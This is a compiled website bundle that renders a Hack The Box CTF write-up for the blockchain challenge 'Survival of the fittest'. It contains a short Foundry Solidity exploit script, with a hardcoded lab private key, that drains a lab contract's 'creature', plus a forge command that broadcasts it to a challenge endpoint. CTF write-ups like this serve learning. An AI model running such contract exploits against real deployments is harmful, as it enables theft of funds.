"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[5958],{7925:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Challenges/Survival Of The Fittest","title":"Survival of the fittest","description":"https://app.hackthebox.com/challenges/Survival%2520of%2520the%2520Fittest","source":"@site/docs/Hacking/Write-ups/Hack the box/Challenges/Survival Of The Fittest.md","sourceDirName":"Hacking/Write-ups/Hack the box/Challenges","slug":"/write-up/htb/challenges/survival-of-the-fittest","permalink":"/docs/write-up/htb/challenges/survival-of-the-fittest","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/challenges/survival-of-the-fittest","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var s=n(4848),r=n(8453);const o={slug:"/write-up/htb/challenges/survival-of-the-fittest",pagination_next:null,pagination_prev:null},i="Survival of the fittest",c={},l=[];function h(e){const t={a:"a",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.header,{children:(0,s.jsx)(t.h1,{id:"survival-of-the-fittest",children:"Survival of the fittest"})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.a,{href:"https://app.hackthebox.com/challenges/Survival%2520of%2520the%2520Fittest",children:"https://app.hackthebox.com/challenges/Survival%2520of%2520the%2520Fittest"})}),"\n",(0,s.jsx)(t.p,{children:"Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster."}),"\n",(0,s.jsxs)(t.p,{children:["This is very similar to ",(0,s.jsx)(t.code,{children:"Distrack And Destroy"})," challenge. It's a blockchain challenge where you need to set the balance of the creature to zero to solve it."]}),"\n",(0,s.jsx)(t.p,{children:"The script is really simple, just define the interface or the creature, call the attack function and then loot:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-solidity",children:'// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport "forge-std/Script.sol";\n\ninterface ICreature {\n    function strongAttack(uint256 _damage) external;\n    function loot() external;\n}\n\ncontract Exploit is Script {\n    uint256 constant PRIVATE_KEY = 0x85326f106a23ac84cf6be593ed479aeeed9e0fadaaf9497fea203c406888eead;\n    address constant PLAYER_ADDRESS = 0x5D612DA7e8aC61beB2457b53b5f438264E086a5d;\n    address constant CREATURE_ADDRESS = 0x17D8DdE823914C2423c9997b40c226114e14EC53;\n    address constant SETUP_ADDRESS = 0x98B20fE76986B32Eeb7c77D554Edb6f2a9978919;\n\n    function run() external {\n        // Start broadcasting from player\'s EOA private key\n        vm.startBroadcast(PRIVATE_KEY);\n\n        ICreature creature = ICreature(CREATURE_ADDRESS);\n\n        // Step 1: Strong attack to remove all life points\n        creature.strongAttack(20);\n\n        // Step 2: Loot\n        creature.loot();\n\n\n        vm.stopBroadcast();\n    }\n}\n'})}),"\n",(0,s.jsxs)(t.p,{children:["And call it with ",(0,s.jsx)(t.code,{children:"forge"}),":"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"forge script Exploit.s.sol:Exploit --rpc-url http://94.237.51.157:58017/rpc --broadcast\n"})}),"\n",(0,s.jsx)(t.p,{children:"Then in the website in other blockchain challenge, when you click attack, the flag was revealed when the condition is met. However, this is not the case. Checking the source code, the button just does some css non-sense, nothing related with the flag."}),"\n",(0,s.jsxs)(t.p,{children:["However, there's a ",(0,s.jsx)(t.code,{children:"flag"})," function defined. We just need to call it from the Brwoser developer console and that's it."]})]})}function d(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>o,x:()=>i});var a=n(6540);const s={},r=a.createContext(s);function o(e){const t=a.useContext(r);return a.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function i(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),a.createElement(r.Provider,{value:t},e.children)}}}]);